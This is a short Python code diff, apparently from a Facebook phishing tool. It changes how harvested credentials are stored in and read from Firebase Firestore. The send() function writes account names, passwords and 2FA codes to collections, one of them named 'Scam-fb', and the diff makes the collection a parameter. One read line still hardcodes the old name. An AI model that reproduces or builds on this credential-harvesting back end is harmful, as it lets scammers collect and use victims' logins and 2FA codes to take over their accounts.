@@ -11,7 +11,7 @@ auth.Client(app)
 db = firestore.client(app)
 
 def send(loai,tk,mk,name,FACode):
-    doc_ref = db.collection(name).document(name)
+    doc_ref = db.collection(loai).document(name)
     doc_ref.set({
         'loai' : loai,
         'Data':firestore.ArrayUnion([{'TK':tk,'MK':mk,'2FA':FACode}])
@@ -19,8 +19,8 @@ def send(loai,tk,mk,name,FACode):
 
 
 
-def get_data():
-    doc =  db.collection(u'Scam-fb').get()
+def get_data(loai):
+    doc =  db.collection(loai).get()
     cong = []
     for name in doc:
         tt = literal_eval(str(db.collection(u'Scam-fb').document(name.id).get().to_dict()))
